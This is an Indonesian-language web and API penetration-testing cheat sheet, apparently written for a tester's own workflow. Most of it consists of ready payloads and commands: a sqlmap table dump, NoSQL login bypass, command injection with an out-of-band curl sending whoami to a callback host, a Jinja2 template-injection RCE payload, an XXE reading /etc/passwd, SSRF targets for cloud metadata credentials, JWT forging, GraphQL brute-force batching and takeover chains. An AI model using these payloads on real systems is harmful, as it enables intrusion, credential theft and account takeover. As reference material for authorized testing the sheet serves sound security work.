# WEB / API — Testing Reference

> Untuk web app, REST/GraphQL API, auth. Pola: **map dulu** semua fitur & endpoint → uji **per-fitur**
> secara sistematis → chain. Selalu simpan request/response di `web/`.

## Daftar Isi
1. [Mapping & Auth model](#mapping)
2. [Access control: IDOR/BOLA, BFLA](#access)
3. [Injection: SQLi, NoSQLi, cmd, SSTI, LFI/RFI](#injection)
4. [SSRF](#ssrf)
5. [XSS & client-side](#xss)
6. [File upload](#upload)
7. [Auth: JWT, OAuth, session, reset](#auth)
8. [API-specific: REST, GraphQL, mass assignment, rate limit](#api)
9. [CORS](#cors)
10. [Deserialization & misc](#misc)

---

<a name="mapping"></a>
## 1. Mapping & Auth Model

Sebelum nyerang, petakan: role apa saja? endpoint apa? fitur apa yang sensitif (bayar, admin, upload,
export, akun)? Buat 2 akun (userA, userB) + kalau bisa akun admin buat uji access control.

```
Proxy semua traffic → Burp / Caido. Aktifkan history + sitemap.
Klik SEMUA fitur sbagai user normal dulu → rekam request → baru manipulasi.
```

---

<a name="access"></a>
## 2. Access Control — IDOR / BOLA / BFLA (paling sering & high impact)

**IDOR / BOLA** (Broken Object Level Auth) — ganti ID objek milik orang lain:
```bash
# Ambil resource userA lalu ulang pakai session userB:
curl -sS -H "Authorization: Bearer $USERB" https://$T/api/orders/1001   # 1001 milik userA?
# Variasi: numeric ++/--, UUID tebak/leak, base64-encoded id, hash predictable
# Cek juga: parameter tersembunyi (?userId=), body JSON ({"account_id":...}), header (X-User-Id)
```

**BFLA** (Broken Function Level Auth) — akses fungsi admin sebagai user biasa:
```bash
# Endpoint admin dipanggil dengan token user biasa:
curl -sS -X POST -H "Authorization: Bearer $USER" https://$T/api/admin/users -d '{...}'
# Ganti method: GET→PUT/DELETE. Ganti path: /user/x → /admin/user/x
```

Verifikasi: response beda antar user = kontrol jalan. Response sama = **IDOR/BFLA**.

---

<a name="injection"></a>
## 3. Injection

**SQLi:**
```bash
# Deteksi manual: ' " )-- ' OR '1'='1  → error/behavior berubah
# Time-based blind: ' OR SLEEP(5)-- -   (MySQL) / ' OR pg_sleep(5)-- (PG)
sqlmap -r web/request.txt --batch --risk 2 --level 3 --dbs
sqlmap -r web/request.txt --batch --dump -T users -D appdb   # setelah dapat DB
# WAF? --tamper=space2comment,between --random-agent
```

**NoSQLi (Mongo dll):**
```
Login bypass: {"user":{"$ne":null},"pass":{"$ne":null}}
Auth: user=admin&pass[$ne]=x   (form URL-encoded)
```

**Command injection:**
```
; id | id `id` $(id) %0aid
Blind: ; sleep 5   /  ; curl http://<collab>/$(whoami)   (out-of-band via Burp Collaborator/interactsh)
```

**SSTI (template injection):**
```
Deteksi: {{7*7}} ${7*7} #{7*7} <%= 7*7 %>  → 49 = vuln
Jinja2 RCE: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
Freemarker/Velocity/Twig punya payload masing-masing → cek tplmap
```

**LFI / Path traversal:**
```
?file=../../../../etc/passwd
Bypass: ....//  ..%2f  %252e%252e%2f  null byte %00 (legacy)
PHP wrapper: php://filter/convert.base64-encode/resource=index.php  → baca source
Log poisoning / /proc/self/environ → LFI2RCE
```

---

<a name="ssrf"></a>
## 4. SSRF (Server-Side Request Forgery)

```bash
# Endpoint yang fetch URL (webhook, image proxy, PDF gen, import-from-url, avatar)
url=http://<interactsh>/   → callback = SSRF terkonfirmasi
```

**Cloud metadata (impact tinggi — sering → creds):**
```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
       (IMDSv2 butuh token: PUT /latest/api/token header X-aws-ec2-metadata-token-ttl-seconds)
GCP:   http://metadata.google.internal/computeMetadata/v1/  (header: Metadata-Flavor: Google)
Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  (header: Metadata:true)
```

**Bypass filter:**
```
http://127.0.0.1 → http://127.1 http://0x7f.0.0.1 http://[::1] http://2130706433
DNS rebinding, redirect (302 → internal), http://localhost.<attacker>.com
```

---

<a name="xss"></a>
## 5. XSS & Client-side

```
Reflected: "><script>alert(document.domain)</script>  → cek konteks (HTML/attr/JS/URL)
Attr break: " onmouseover=alert(1) x="
JS context: '-alert(1)-'  atau  \';alert(1)//
Stored: input yang tersimpan & ditampilkan ke user lain (comment, profil, nama)
DOM: sink innerHTML/document.write/eval + source location.hash/search → cek JS
Impact PoC: curi cookie (kalau no HttpOnly), keylogger, CSRF token theft, akun takeover
```

Terkait: **CSRF** (state-changing tanpa token/SameSite), **Clickjacking** (no X-Frame-Options/CSP frame-ancestors), **Open redirect** (?next=//evil.com → phishing/OAuth token theft).

---

<a name="upload"></a>
## 6. File Upload

```
Bypass ekstensi: shell.php.jpg, shell.pHp, shell.php%00.jpg, shell.php;.jpg
Content-Type spoof: image/jpeg + magic bytes GIF89a; di depan payload
.htaccess upload → eksekusi ekstensi arbitrary (Apache)
SVG → XSS/XXE. Polyglot file. Path traversal di filename → overwrite.
Verifikasi: akses file terupload → dieksekusi server? → RCE
```

**XXE (jika parsing XML):**
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
Blind/OOB XXE → exfil via DTD eksternal. SSRF via XXE juga.
```

---

<a name="auth"></a>
## 7. Auth — JWT, OAuth, Session, Reset

**JWT:**
```
alg:none → hapus signature, set {"alg":"none"}
Key confusion RS256→HS256 → sign ulang pakai public key sbg secret HMAC
Weak secret → jwt_tool / hashcat -m 16500 crack
kid injection: "kid":"../../dev/null" + secret kosong; atau kid SQLi/path
jwt_tool <token> -M at  → automated attacks; -C -d wordlist → crack
Cek: exp diabaikan? claim role/admin bisa diubah? (mass assignment di JWT)
```

**OAuth / OIDC:**
```
redirect_uri lemah → curi code/token (open redirect di allowlist, subdomain, path)
state param hilang → CSRF login
Implicit flow token di URL fragment → bocor via referer/log
```

**Password reset / OTP:**
```
Token reset predictable/reusable/no-expiry? Host header injection → poison reset link.
OTP: no rate limit → brute (000000-999999). Response beda valid/invalid → user enum.
Account takeover chain: reset + IDOR / reset + no-rate-limit.
```

---

<a name="api"></a>
## 8. API-Specific

**GraphQL:**
```graphql
# Introspection terbuka? (bocorkan seluruh schema)
{ __schema { types { name fields { name } } } }
# Endpoint: /graphql /graphiql /api/graphql /v1/graphql /query
# Batching → bypass rate limit / brute:
[{"query":"mutation{login(u:\"a\",p:\"1\"){token}}"}, ... x100]
# Field suggestion (walau introspection off) → tebak field. Alias abuse → DoS/brute.
# clairvoyance / graphw00f / InQL untuk otomasi.
```

**Mass Assignment (over-posting):**
```json
POST /api/register
{"email":"x@y.z","password":"Aa1!","role":"admin","isAdmin":true,"verified":true,"balance":99999}
```

**Rate limit bypass:**
```
Header: X-Forwarded-For: <rotasi IP>, X-Originating-IP, X-Real-IP, X-Client-IP
Path case/format: /API/login /api//login /api/login%00 /api/login?_=<ts>
Body param sampah, ganti user-agent, HTTP/2 rapid-reset (hati-hati DoS)
```

**REST misc:** HTTP method tampering (GET→PUT/PATCH/DELETE), versi lama (`/v1/` masih hidup tanpa fix),
verbose error → info leak, `Accept` manipulation.

---

<a name="cors"></a>
## 9. CORS Misconfiguration

```bash
curl -sS -H "Origin: https://evil.com" -I https://$T/api/me
# Bahaya:
#   Access-Control-Allow-Origin: https://evil.com  (reflected) + ACAC: true → curi data credentialed
#   ACAO: null → Origin: null (via sandboxed iframe) exploit
#   ACAO: *  + credentialed data (walau spec larang, cek endpoint)
# Subdomain wildcard trust → XSS di subdomain jadi CORS bypass
```

---

<a name="misc"></a>
## 10. Deserialization & Misc

```
Java: objek serialized (rO0... base64 / oct-stream) → ysoserial gadget chain → RCE
.NET: ViewState (__VIEWSTATE) tanpa MAC → ysoserial.net; JSON.NET TypeNameHandling
PHP: unserialize() input user → POP chain (phpggc)
Python: pickle.loads input user → RCE
Node: prototype pollution (__proto__) → gadget → RCE/authz bypass
```

**HTTP Request Smuggling** (CL.TE / TE.CL) → cache poisoning, auth bypass, request hijack.
**Web cache poisoning** via unkeyed header (X-Forwarded-Host) → stored XSS ke semua user.

---

## Chaining favorit (impact besar)
- Open redirect + OAuth → account takeover
- SSRF + cloud metadata → creds → cloud takeover
- IDOR (baca) + IDOR (tulis) → takeover massal
- Self-XSS + CSRF/cache poison → stored XSS
- LFI + log poisoning → RCE
- Reflected XSS + weak CORS → data exfil credentialed
